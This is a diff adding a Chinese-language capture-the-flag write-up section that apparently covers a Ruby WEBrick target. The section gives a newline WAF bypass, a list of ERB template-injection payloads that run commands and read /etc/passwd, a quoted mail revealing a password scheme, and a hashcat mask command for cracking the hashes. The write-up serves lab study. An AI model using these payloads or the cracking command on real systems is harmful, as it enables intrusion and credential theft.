@@ -28,6 +28,47 @@ PORT   STATE SERVICE
 ![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240307143815.png)
 webrick 1.7.0 ,一个ruby的web框架
 
+输出成绩会回显,尝试ruby的`ssti`payload `<%= 7*7 %>`
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240307151037.png)
+
+注意需要 `a%0A<%= 7*7 %>` 绕过waf检测
+
+
+```bash
+<%= system("whoami") %> #Execute code
+<%= Dir.entries('/') %> #List folder
+<%= File.open('/etc/passwd').read %> #Read file
+
+<%= system('cat /etc/passwd') %>
+<%= `ls /` %>
+<%= IO.popen('ls /').readlines()  %>
+<% require 'open3' %><% @a,@b,@c,@d=Open3.popen3('whoami') %><%= @b.readline()%>
+<% require 'open4' %><% @a,@b,@c,@d=Open4.popen4('whoami') %><%= @c.readline()%>
+```
+
+成功拿到shell
+![image.png|475](https://gitee.com/leiye87/typora_picture/raw/master/20240307152200.png)
+
+在`/var/mail/susan`里有如下内容
+```text
+Due to our transition to Jupiter Grades because of the PupilPath data breach, I thought we should also migrate our credentials ('our' including the other students
+
+in our class) to the new platform. I also suggest a new password specification, to make things easier for everyone. The password format is:
+
+{firstname}_{firstname backwards}_{randomly generated integer between 1 and 1,000,000,000}
+
+Note that all letters of the first name should be convered into lowercase.
+
+Please hit me with updates on the migration when you can. I am currently registering our university with the platform.
+
+- Tina, your delightful student
+```
+
+即使用新的密码,再加上之前读到的sqlite3.db文件,可以破解密码
+
+`hashcat -a 3 -m 1400 hashes.txt  susan_nasus_?d?d?d?d?d?d?d?d?d`
+
+内存不够,先跳过
 
 ### Sau
 #### user
